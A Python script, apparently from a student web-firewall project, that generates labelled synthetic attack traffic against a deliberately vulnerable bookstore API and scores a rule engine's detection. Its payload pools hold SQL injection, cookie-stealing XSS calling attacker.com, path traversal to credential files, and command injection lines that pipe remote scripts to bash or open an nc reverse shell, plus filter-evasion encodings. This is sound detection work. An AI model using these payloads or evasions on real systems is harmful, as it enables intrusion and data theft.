#!/usr/bin/env python3
"""
Generate Synthetic Malicious Attack HTTP Traffic Dataset (10,000 samples)
Task 4.2 - Phase 4: Dataset Generation & Lab Traffic Collection

Mô phỏng chân thực và phong phú các đòn tấn công vào vulnerable-api (Bookie Bookstore):
1. SQL Injection (SQLI - label 1) - 2,500 samples
   - Auth Bypass (POST /api/v1/vulnerable/auth/login/)
   - UNION-based Search (GET /api/v1/vulnerable/books/search/?q=...)
   - Boolean & Error-based queries
2. Cross-Site Scripting (XSS - label 2) - 2,500 samples
   - Stored XSS via Reviews (POST /api/v1/vulnerable/reviews/)
   - Reflected XSS via Query/Reviews (GET /api/v1/vulnerable/reviews/?book_id=...)
   - Ratings & Contact Forms (POST /rate/{id}/, POST /contact/)
3. Path Traversal / LFI (PATH - label 3) - 2,500 samples
   - File Download (GET /api/v1/vulnerable/files/download/?file=...)
   - Invoices & Reports (GET /orders/{id}/invoice.pdf?file=...)
4. Command Injection / RCE (CMD - label 4) - 2,500 samples
   - Network Diagnostic Ping (POST /api/v1/vulnerable/admin/ping/)

Tích hợp 60% biến thể làm rối (Adaptive Evasion Variations):
- SQL: Comment insertion, Case alternation, Whitespace substitution, URL/Double URL encoding.
- XSS: Event handler alternation, HTML entities, Separator variations, Script case mixing.
- PATH: Dot-dot-slash variations (..//, ..\\), Double URL encoding (%252e%252e%252f), Null bytes.
- CMD: Separators (;, &&, ||, |), IFS variable ($IFS), subshells ($(), ``), string concat.
"""

import argparse
import csv
import json
import os
import random
import sys
from pathlib import Path
from urllib.parse import quote

# Add project root and gateway to sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
GATEWAY_PATH = PROJECT_ROOT / "gateway"
if str(GATEWAY_PATH) not in sys.path:
    sys.path.insert(0, str(GATEWAY_PATH))

# Ensure UTF-8 stdout encoding on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ATTACKER_IPS = [
    # External / Remote Attacker IPs
    "192.168.1.105", "10.0.0.88", "172.16.4.12", "192.168.1.200", "192.168.1.210",
    "10.0.0.99", "172.16.5.55", "198.51.100.23", "203.0.113.45", "198.51.100.77",
    # Red Team Machine 2
    "192.168.1.150", "192.168.1.151", "192.168.1.152",
]

ATTACK_USER_AGENTS = [
    # Standard Browsers (living off the land)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    # Automated Scanners / Attack CLI Tools (SecLists / Red Team tools)
    "sqlmap/1.7.11#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "curl/8.4.0",
    "Wget/1.21.3",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
]

# ---------------------------------------------------------------------------
# RAW PAYLOAD POOLS
# ---------------------------------------------------------------------------

BASE_SQLI_PAYLOADS = [
    # Auth Bypass
    "' OR '1'='1",
    "admin' --",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "admin' #",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' OR 1=1/*",
    "admin'/*",
    "' OR ''='",
    # UNION-based
    "' UNION SELECT null, username, password, null FROM auth_user--",
    "' UNION SELECT 1, 'admin', 'hacked', 100--",
    "' UNION ALL SELECT null, email, password, null FROM auth_user--",
    "1 UNION SELECT 1, sqlite_version(), 3, 4--",
    "1' UNION SELECT null, tbl_name, null, null FROM sqlite_master--",
    "' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns--",
    # Boolean / Error / Tautology
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 5-2=3--",
    "' OR 'a' LIKE 'a",
    "'; DROP TABLE books_book;--",
    "'; SELECT pg_sleep(5);--",
    "' WAITFOR DELAY '0:0:5'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
]

BASE_XSS_PAYLOADS = [
    # Script tag
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script src='http://attacker.com/xss.js'></script>",
    "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "<script>fetch('http://attacker.com', {body: document.cookie})</script>",
    # Event Handlers (img, svg, body, iframe, input)
    "<img src=x onerror=alert(1)>",
    "<img src='invalid' onerror='alert(\"XSS\")'>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('PBL6')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<input type='text' autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    # Attributes & Inline Javascript
    "\" onmouseover=\"alert(1)\"",
    "' onfocus='alert(1)'",
    "javascript:alert(document.domain)",
    "javascript:prompt(1)",
    "javascript:confirm(1)",
]

BASE_PATH_TRAVERSAL_PAYLOADS = [
    # Linux files
    "../../../../etc/passwd",
    "../../etc/shadow",
    "../../../etc/hosts",
    "../../../../var/log/syslog",
    "../../../../proc/self/environ",
    # Windows files
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../boot.ini",
    # Application / Config files
    "../../manage.py",
    "../../bookstore/settings/base.py",
    "../../../.env",
    "../../data/waf_security.db",
    "../../../../sqlite3.db",
    # Redundant / Root traversals
    "/etc/passwd",
    "C:\\windows\\system32\\calc.exe",
    "../../../../var/log/apache2/access.log",
]

BASE_CMD_INJECTION_PAYLOADS = [
    # Basic Separators
    "; whoami",
    "| id",
    "&& uname -a",
    "|| cat /etc/passwd",
    "& dir",
    # Subshells & Command substitution
    "; `whoami`",
    "; $(id)",
    "| $(cat /etc/passwd)",
    "&& `cat /etc/hosts`",
    # Dangerous utilities
    "; netstat -an",
    "| ps aux",
    "&& curl http://attacker.com/shell.sh | bash",
    "; wget -qO- http://attacker.com/evil | sh",
    "; nc -e /bin/sh 10.0.0.1 4444",
    "| ipconfig /all",
    "& systeminfo",
]

# ---------------------------------------------------------------------------
# OBFUSCATION / EVASION ENGINES
# ---------------------------------------------------------------------------

def random_case(text: str) -> str:
    """Randomly alternates case of letters."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in text)


def obfuscate_sqli(payload: str) -> str:
    """Applies SQLi evasion variations."""
    technique = random.choice([
        "comment_insertion",
        "case_alternation",
        "whitespace_variation",
        "url_encode",
        "double_url_encode",
        "tautology_swap",
    ])

    if technique == "comment_insertion":
        # e.g., UNION SELECT -> UN/**/ION/**/SE/**/LECT
        res = payload.replace("UNION", "UN/**/ION")
        res = res.replace("SELECT", "SE/**/LECT")
        res = res.replace(" ", "/**/")
        return res
    elif technique == "case_alternation":
        # e.g., union select -> uNiOn SeLeCt
        keywords = ["UNION", "SELECT", "WHERE", "AND", "OR", "FROM", "ORDER BY"]
        res = payload
        for kw in keywords:
            res = res.replace(kw, random_case(kw))
            res = res.replace(kw.lower(), random_case(kw))
        return res
    elif technique == "whitespace_variation":
        # Replace space with tab or newline or +
        sub = random.choice(["+", "%09", "%0a", "/**/"])
        return payload.replace(" ", sub)
    elif technique == "url_encode":
        return quote(payload)
    elif technique == "double_url_encode":
        return quote(quote(payload))
    else:  # tautology_swap
        swaps = [
            ("' OR '1'='1", "' OR 'a'='a'"),
            ("1=1", "2>1"),
            ("1=1", "5-2=3"),
            ("1=1", "'a' LIKE 'a'"),
        ]
        res = payload
        for old, new in swaps:
            if old in res:
                res = res.replace(old, new)
                break
        return res


def obfuscate_xss(payload: str) -> str:
    """Applies XSS evasion variations."""
    technique = random.choice([
        "case_alternation",
        "event_handler_switch",
        "slash_separator",
        "html_entities",
        "url_encode",
        "from_char_code",
    ])

    if technique == "case_alternation":
        # e.g. <script> -> <sCrIpT>
        res = payload
        for tag in ["script", "alert", "onload", "onerror", "svg", "img", "iframe"]:
            res = res.replace(tag, random_case(tag))
        return res
    elif technique == "event_handler_switch":
        # Switch onerror/onload to other handlers
        handlers = ["onfocus", "onmouseover", "ontoggle", "onloadend"]
        h = random.choice(handlers)
        res = payload.replace("onerror", h).replace("onload", h)
        return res
    elif technique == "slash_separator":
        # e.g., <img src=x onerror=alert(1)> -> <img/src=x/onerror=alert(1)>
        return payload.replace(" ", "/")
    elif technique == "html_entities":
        # Replace < and > with decimal/hex entities
        return payload.replace("<", "&#x3C;").replace(">", "&#x3E;")
    elif technique == "url_encode":
        return quote(payload)
    else:  # from_char_code
        # alert(1) -> eval(String.fromCharCode(97,108,101,114,116,40,49,41))
        return payload.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,49,41))")


def obfuscate_path(payload: str) -> str:
    """Applies Path Traversal evasion variations."""
    technique = random.choice([
        "dot_slash_permutation",
        "url_encode_dots",
        "double_url_encode",
        "null_byte",
        "redundant_slashes",
        "backslash_mixture",
    ])

    if technique == "dot_slash_permutation":
        # e.g., ../ -> ....// or ..././
        sub = random.choice(["....//", "..././", "..///"])
        return payload.replace("../", sub)
    elif technique == "url_encode_dots":
        # e.g., ../ -> %2e%2e/ or %2e%2e%2f
        sub = random.choice(["%2e%2e/", "%2e%2e%2f", "..%2f"])
        return payload.replace("../", sub)
    elif technique == "double_url_encode":
        # e.g., %252e%252e%252f
        return payload.replace("../", "%252e%252e%252f")
    elif technique == "null_byte":
        # Null byte injection before expected extension
        return f"{payload}%00.pdf"
    elif technique == "redundant_slashes":
        return payload.replace("../", "..//..//")
    else:  # backslash_mixture
        return payload.replace("/", "\\")


def obfuscate_cmd(payload: str) -> str:
    """Applies Command Injection evasion variations."""
    technique = random.choice([
        "ifs_substitution",
        "quote_insertion",
        "subshell_wrapping",
        "url_encode",
        "backslash_escape",
        "base64_pipe",
    ])

    if technique == "ifs_substitution":
        # Replace spaces with $IFS or ${IFS}
        sub = random.choice(["$IFS", "${IFS}", "$IFS$9"])
        return payload.replace(" ", sub)
    elif technique == "quote_insertion":
        # e.g. cat -> c'a't or whoami -> w"h"o"a"m"i
        res = payload.replace("cat", "c'a't")
        res = res.replace("whoami", "w'h'o'a'm'i")
        res = res.replace("id", "i''d")
        return res
    elif technique == "subshell_wrapping":
        # e.g. ; whoami -> ; $(whoami)
        words = payload.strip().split()
        if len(words) >= 2 and words[0] in [";", "|", "&&", "||", "&"]:
            cmd = " ".join(words[1:])
            return f"{words[0]} $({cmd})"
        return payload
    elif technique == "url_encode":
        return quote(payload)
    elif technique == "backslash_escape":
        # e.g., whoami -> w\hoami
        return payload.replace("whoami", "w\\ho\\ami").replace("id", "i\\d")
    else:  # base64_pipe
        # e.g., ; echo d2hvYW1p | base64 -d | sh
        return "; echo d2hvYW1p | base64 -d | sh"


# ---------------------------------------------------------------------------
# GENERATORS FOR 4 ATTACK FAMILIES
# ---------------------------------------------------------------------------

def generate_headers(method: str, is_json: bool = False, host: str = "localhost:8000") -> tuple[str, str]:
    user_agent = random.choice(ATTACK_USER_AGENTS)
    headers_dict = {
        "Host": host,
        "User-Agent": user_agent,
        "Accept": "application/json" if is_json else "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
    }
    if is_json:
        headers_dict["Content-Type"] = "application/json"
    elif method == "POST":
        headers_dict["Content-Type"] = "application/x-www-form-urlencoded"

    return json.dumps(headers_dict), user_agent


def gen_sqli_attack(use_evasion: bool = True) -> dict:
    """Family 1: SQL Injection (SQLI - label 1)"""
    sub_type = random.choice(["auth_login", "books_search", "category_filter"])
    raw_payload = random.choice(BASE_SQLI_PAYLOADS)
    payload = obfuscate_sqli(raw_payload) if use_evasion else raw_payload
    client_ip = random.choice(ATTACKER_IPS)

    if sub_type == "auth_login":
        method = "POST"
        path = "/api/v1/vulnerable/auth/login/"
        query_params = ""
        body_dict = {
            "username": payload,
            "password": random.choice(["password", "123456", "admin123", ""]),
        }
        body = json.dumps(body_dict)
        headers, ua = generate_headers(method, is_json=True)
    elif sub_type == "books_search":
        method = "GET"
        path = "/api/v1/vulnerable/books/search/"
        query_params = f"q={payload}"
        body = ""
        headers, ua = generate_headers(method, is_json=True)
    else:  # category_filter
        method = "GET"
        path = "/books/"
        query_params = f"category={payload}"
        body = ""
        headers, ua = generate_headers(method, is_json=False)

    return {
        "method": method,
        "path": path,
        "query_params": query_params,
        "headers": headers,
        "body": body,
        "client_ip": client_ip,
        "user_agent": ua,
        "label": 1,
        "attack_type": "SQLI",
    }


def gen_xss_attack(use_evasion: bool = True) -> dict:
    """Family 2: Cross-Site Scripting (XSS - label 2)"""
    sub_type = random.choice(["stored_review", "reflected_review", "rate_book", "contact_form"])
    raw_payload = random.choice(BASE_XSS_PAYLOADS)
    payload = obfuscate_xss(raw_payload) if use_evasion else raw_payload
    client_ip = random.choice(ATTACKER_IPS)

    if sub_type == "stored_review":
        method = "POST"
        path = "/api/v1/vulnerable/reviews/"
        query_params = ""
        body_dict = {
            "book_id": random.randint(1, 50),
            "rating": 5,
            "review_text": f"Sách hay! {payload}",
        }
        body = json.dumps(body_dict, ensure_ascii=False)
        headers, ua = generate_headers(method, is_json=True)
    elif sub_type == "reflected_review":
        method = "GET"
        path = "/api/v1/vulnerable/reviews/"
        query_params = f"book_id={payload}"
        body = ""
        headers, ua = generate_headers(method, is_json=True)
    elif sub_type == "rate_book":
        method = "POST"
        book_id = random.randint(1, 50)
        path = f"/rate/{book_id}/"
        query_params = ""
        body_dict = {
            "score": 5,
            "comment": payload,
        }
        body = json.dumps(body_dict, ensure_ascii=False)
        headers, ua = generate_headers(method, is_json=True)
    else:  # contact_form
        method = "POST"
        path = "/contact/"
        query_params = ""
        body_dict = {
            "name": payload,
            "email": "attacker@evil.com",
            "subject": "Hỏi đáp bảo mật",
            "message": payload,
        }
        body = json.dumps(body_dict, ensure_ascii=False)
        headers, ua = generate_headers(method, is_json=True)

    return {
        "method": method,
        "path": path,
        "query_params": query_params,
        "headers": headers,
        "body": body,
        "client_ip": client_ip,
        "user_agent": ua,
        "label": 2,
        "attack_type": "XSS",
    }


def gen_path_attack(use_evasion: bool = True) -> dict:
    """Family 3: Path Traversal (PATH - label 3)"""
    sub_type = random.choice(["files_download", "invoice_download", "static_traversal"])
    raw_payload = random.choice(BASE_PATH_TRAVERSAL_PAYLOADS)
    payload = obfuscate_path(raw_payload) if use_evasion else raw_payload
    client_ip = random.choice(ATTACKER_IPS)

    if sub_type == "files_download":
        method = "GET"
        path = "/api/v1/vulnerable/files/download/"
        query_params = f"file={payload}"
        body = ""
        headers, ua = generate_headers(method, is_json=False)
    elif sub_type == "invoice_download":
        method = "GET"
        order_id = random.randint(1, 20)
        path = f"/orders/{order_id}/invoice.pdf"
        query_params = f"template={payload}"
        body = ""
        headers, ua = generate_headers(method, is_json=False)
    else:  # static_traversal
        method = "GET"
        path = f"/static/{payload}"
        query_params = ""
        body = ""
        headers, ua = generate_headers(method, is_json=False)

    return {
        "method": method,
        "path": path,
        "query_params": query_params,
        "headers": headers,
        "body": body,
        "client_ip": client_ip,
        "user_agent": ua,
        "label": 3,
        "attack_type": "PATH",
    }


def gen_cmd_attack(use_evasion: bool = True) -> dict:
    """Family 4: Command Injection (CMD - label 4)"""
    raw_payload = random.choice(BASE_CMD_INJECTION_PAYLOADS)
    payload = obfuscate_cmd(raw_payload) if use_evasion else raw_payload
    client_ip = random.choice(ATTACKER_IPS)

    target_host = f"127.0.0.1{payload}"
    method = "POST"
    path = "/api/v1/vulnerable/admin/ping/"
    query_params = ""
    body = json.dumps({"host": target_host})
    headers, ua = generate_headers(method, is_json=True)

    return {
        "method": method,
        "path": path,
        "query_params": query_params,
        "headers": headers,
        "body": body,
        "client_ip": client_ip,
        "user_agent": ua,
        "label": 4,
        "attack_type": "CMD",
    }


def generate_attack_dataset(total_count: int = 10000, seed: int = 42, evasion_ratio: float = 0.6) -> list[dict]:
    """
    Sinh tổng số mẫu tấn công chia đều cho 4 họ tấn công (2,500 mẫu/lớp).
    Mỗi lớp có tỷ lệ evasion_ratio (mặc định 60%) áp dụng kỹ thuật làm rối.
    """
    random.seed(seed)
    per_class_count = total_count // 4

    samples = []
    generators = [
        ("SQLI", gen_sqli_attack),
        ("XSS", gen_xss_attack),
        ("PATH", gen_path_attack),
        ("CMD", gen_cmd_attack),
    ]

    for family, gen_func in generators:
        for _ in range(per_class_count):
            use_evasion = random.random() < evasion_ratio
            samples.append(gen_func(use_evasion=use_evasion))

    # Shuffle dataset
    random.shuffle(samples)
    return samples


def evaluate_with_rule_engine(samples: list[dict]) -> dict:
    """
    Đánh giá tỷ lệ phát hiện của Rule Engine trên tập tấn công.
    Thống kê số lượng bị bắt bởi 16 rules và số lượng né tránh thành công.
    """
    try:
        from app.security.engine import RuleEngine
    except ImportError:
        print("[!] Không thể import RuleEngine từ app.security.engine.")
        return {}

    engine = RuleEngine()
    stats = {
        "total": len(samples),
        "detected": 0,
        "evaded": 0,
        "by_family": {"SQLI": {"detected": 0, "evaded": 0},
                      "XSS": {"detected": 0, "evaded": 0},
                      "PATH": {"detected": 0, "evaded": 0},
                      "CMD": {"detected": 0, "evaded": 0}},
    }

    for sample in samples:
        body_bytes = sample["body"].encode("utf-8") if sample["body"] else None
        headers_dict = json.loads(sample["headers"]) if sample["headers"] else None
        fam = sample["attack_type"]

        res = engine.inspect_request(
            path=sample["path"],
            query_params=sample["query_params"] if sample["query_params"] else None,
            headers=headers_dict,
            body_bytes=body_bytes,
        )

        if res.is_attack:
            stats["detected"] += 1
            stats["by_family"][fam]["detected"] += 1
        else:
            stats["evaded"] += 1
            stats["by_family"][fam]["evaded"] += 1

    return stats


def main():
    parser = argparse.ArgumentParser(description="Sinh tập dữ liệu synthetic malicious attack traffic cho PBL6")
    parser.add_argument("--count", type=int, default=10000, help="Tổng số request cần sinh (mặc định: 10000)")
    parser.add_argument("--seed", type=int, default=42, help="Seed ngẫu nhiên (mặc định: 42)")
    parser.add_argument("--evasion-ratio", type=float, default=0.6, help="Tỷ lệ mẫu áp dụng làm rối evasion (mặc định: 0.6)")
    parser.add_argument("--output", type=str, default="data/synthetic_attacks.csv", help="Đường dẫn file CSV xuất ra")
    parser.add_argument("--verify", action="store_true", default=True, help="Thống kê tỷ lệ phát hiện với WAF Rule Engine")

    args = parser.parse_args()

    print("=" * 70)
    print(f"🚀 PBL6 Synthetic Malicious Attack Generator (Task 4.2)")
    print(f"• Số lượng mục tiêu : {args.count:,} samples (2,500/lớp)")
    print(f"• Random Seed       : {args.seed}")
    print(f"• Tỷ lệ Evasion     : {args.evasion_ratio * 100:.1f}%")
    print(f"• File đích         : {args.output}")
    print("=" * 70)

    samples = generate_attack_dataset(total_count=args.count, seed=args.seed, evasion_ratio=args.evasion_ratio)

    if args.verify:
        print("\n🔍 Đang đánh giá tỷ lệ phát hiện qua WAF Rule Engine...")
        stats = evaluate_with_rule_engine(samples)
        if stats:
            det_rate = (stats["detected"] / stats["total"]) * 100
            ev_rate = (stats["evaded"] / stats["total"]) * 100
            print(f"• Tổng số mẫu kiểm tra  : {stats['total']:,}")
            print(f"• Bị Rule Engine chặn   : {stats['detected']:,} ({det_rate:.2f}%)")
            print(f"• Vượt qua bằng Evasion : {stats['evaded']:,} ({ev_rate:.2f}%) -> Cần ML & Anomaly phát hiện")
            print("\n📊 Chi tiết theo từng họ tấn công:")
            for fam, counts in stats["by_family"].items():
                fam_total = counts["detected"] + counts["evaded"]
                print(f"  - {fam:<6}: Detected={counts['detected']:,}/{fam_total:,} ({counts['detected']/fam_total*100:.1f}%) | Evaded={counts['evaded']:,} ({counts['evaded']/fam_total*100:.1f}%)")

    # Write to CSV
    output_path = Path(args.output)
    if not output_path.is_absolute():
        output_path = PROJECT_ROOT / output_path
    output_path.parent.mkdir(parents=True, exist_ok=True)

    fieldnames = ["method", "path", "query_params", "headers", "body", "client_ip", "user_agent", "label", "attack_type"]
    with open(output_path, mode="w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(samples)

    file_size_kb = output_path.stat().st_size / 1024
    print("\n" + "=" * 70)
    print(f"🎉 Hoàn thành xuất tập dữ liệu Attack thành công!")
    print(f"• File path : {output_path}")
    print(f"• Dung lượng: {file_size_kb:,.1f} KB")
    print(f"• Tổng dòng : {len(samples) + 1:,} lines (bao gồm header)")
    print("=" * 70)


if __name__ == "__main__":
    main()
